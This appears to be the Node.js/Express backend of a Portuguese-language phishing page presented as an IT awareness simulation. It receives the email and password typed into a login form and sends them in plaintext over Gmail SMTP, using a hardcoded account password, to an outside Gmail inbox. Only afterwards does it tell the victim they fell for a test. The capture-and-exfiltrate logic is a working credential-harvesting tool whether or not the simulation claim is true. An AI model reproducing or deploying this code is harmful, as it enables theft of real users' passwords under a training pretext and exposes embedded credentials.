const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/', async (req, res) => {
  const { email, senha } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'globalsystemdiretoria@gmail.com',
      pass: 'globAl2025'
    }
  });

  const mailOptions = {
    from: 'globalsystemdiretoria@gmail.com',
    to: 'globalsystemdiretoria@gmail.com',
    subject: 'Dados capturados na simulação',
    text: `Email: ${email}\nSenha: ${senha}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.send(`
      <h2 style="font-family:Arial; color:#c62828; text-align:center; margin-top:100px;">
        Você acaba de cair em um teste de phishing.
      </h2>
      <p style="text-align:center; font-family:Arial;">
        Esta é uma simulação de segurança realizada pela equipe de TI para fins de conscientização.
      </p>
    `);
  } catch (error) {
    console.error('Erro ao enviar email:', error);
    res.send('Erro ao processar os dados.');
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
